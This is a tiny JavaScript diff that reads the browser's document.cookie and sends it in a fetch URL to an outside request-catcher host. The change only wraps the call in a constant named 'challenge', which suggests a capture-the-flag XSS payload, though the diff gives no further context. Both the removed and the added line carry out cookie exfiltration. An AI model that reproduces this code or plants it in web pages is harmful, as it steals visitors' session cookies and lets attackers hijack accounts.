@@ -1,3 +1,2 @@
 const cookieClient = document.cookie
-
-fetch(`https://tkjgkrf.requestcatcher.com/${cookieClient}`)
+const challenge = fetch(`https://tkjgkrf.requestcatcher.com/${cookieClient}`)
